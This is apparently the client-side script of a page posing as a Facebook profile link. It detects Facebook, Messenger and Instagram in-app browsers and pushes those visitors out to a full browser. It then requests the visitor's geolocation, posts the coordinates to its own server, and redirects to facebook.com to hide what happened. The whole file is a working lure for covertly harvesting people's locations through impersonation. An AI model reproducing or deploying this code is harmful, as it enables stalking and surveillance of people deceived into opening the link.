function isInAppBrowser() {
  const ua = navigator.userAgent || "";
  return (
    ua.includes("FBAV") ||
    ua.includes("FBAN") ||
    ua.includes("Messenger") ||
    ua.includes("Instagram")
  );
}

function getCoordinates() {
  if (isInAppBrowser()) {
    // If in Messenger/FB, open in default browser
    window.location = "https://facebook-profile-nakz.onrender.com"; // Reload in Safari/Chrome
    return;
  }

  if (!navigator.geolocation) {
    alert("❌ Geolocation not supported.");
    window.location.href = "https://facebook.com";
    return;
  }

  navigator.geolocation.getCurrentPosition(
    (position) => {
      const data = {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
      };

      fetch("/coordinates", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(data)
      })
      .then(() => {
        window.location.href = "https://facebook.com";
      })
      .catch((err) => {
        console.error("Fetch error:", err);
        window.location.href = "https://facebook.com";
      });
    },
    () => {
      alert("❌ Location permission denied.");
      window.location.href = "https://facebook.com";
    }
  );
}
